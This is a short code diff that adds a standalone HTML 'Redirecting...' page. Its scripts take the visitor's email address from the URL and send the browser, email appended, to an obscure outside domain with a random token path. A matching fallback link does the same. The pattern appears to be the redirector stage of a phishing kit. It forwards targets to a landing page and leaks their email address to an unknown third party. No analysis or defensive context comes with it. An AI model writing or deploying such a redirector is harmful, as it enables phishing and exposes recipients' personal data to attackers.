@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    const query = new URLSearchParams(window.location.search);
+    const email = query.get("email") || "unknown";
+    // Redirect with the email value appended
+    window.location.href = "https://loq.s2c2.ink/lhEiKkPP?email=" + encodeURIComponent(email);
+  </script>
+</head>
+<body>
+  <p>Redirecting... If you are not redirected, <a id="redirectLink">click here</a>.</p>
+  <script>
+    document.getElementById("redirectLink").href = "https://loq.s2c2.ink/lhEiKkPP?email=" + encodeURIComponent(email);
+  </script>
+</body>
+</html>
